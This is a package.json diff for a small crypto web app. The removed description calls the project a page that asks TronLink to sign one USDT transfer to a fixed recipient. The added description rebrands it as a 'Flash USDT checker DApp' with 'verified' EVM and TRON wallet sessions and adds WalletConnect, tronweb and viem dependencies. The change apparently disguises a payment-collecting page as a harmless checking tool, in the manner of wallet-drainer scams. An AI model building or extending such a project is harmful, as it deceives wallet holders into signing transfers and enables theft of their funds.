@@ -3,24 +3,32 @@
   "version": "1.0.0",
   "private": true,
   "type": "module",
-  "description": "Static TRON mainnet page that asks TronLink to sign one USDT transfer to a fixed recipient.",
+  "description": "Flash USDT checker DApp with verified EVM and TRON wallet sessions.",
   "engines": {
     "node": ">=20"
   },
   "scripts": {
-    "start": "node scripts/serve.mjs",
+    "start": "npm run bundle:walletconnect && node scripts/serve.mjs",
     "test": "node --test",
     "lint": "node scripts/check-syntax.mjs",
     "typecheck": "tsc -p tsconfig.json --pretty false",
-    "build": "node scripts/build.mjs",
+    "build": "npm run bundle:walletconnect && node scripts/build.mjs",
+    "bundle:walletconnect": "node scripts/build-walletconnect.mjs",
     "qr": "node scripts/make-qr.mjs",
     "check": "npm run lint && npm run typecheck && npm test && npm run build"
   },
   "dependencies": {
-    "qrcode": "1.5.4"
+    "@walletconnect/universal-provider": "2.26.0",
+    "qrcode": "1.5.4",
+    "tronweb": "6.5.1",
+    "viem": "2.57.16"
   },
   "devDependencies": {
     "@types/node": "24.19.2",
+    "esbuild": "0.28.2",
     "typescript": "5.9.3"
+  },
+  "overrides": {
+    "axios": "1.21.0"
   }
 }
